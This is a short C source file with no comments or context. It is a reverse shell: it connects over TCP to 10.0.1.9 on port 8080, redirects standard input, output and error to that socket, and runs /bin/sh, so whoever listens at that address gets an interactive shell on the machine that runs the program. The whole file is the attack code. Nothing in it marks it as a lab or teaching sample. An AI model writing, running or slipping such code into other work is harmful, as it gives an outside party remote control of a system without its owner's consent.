#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    int sockfd;
    struct sockaddr_in serv_addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("10.0.1.9");
    serv_addr.sin_port = htons(8080);

    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    char *argv[] = {"/bin/sh", NULL};

    execve(argv[0], argv, NULL);
}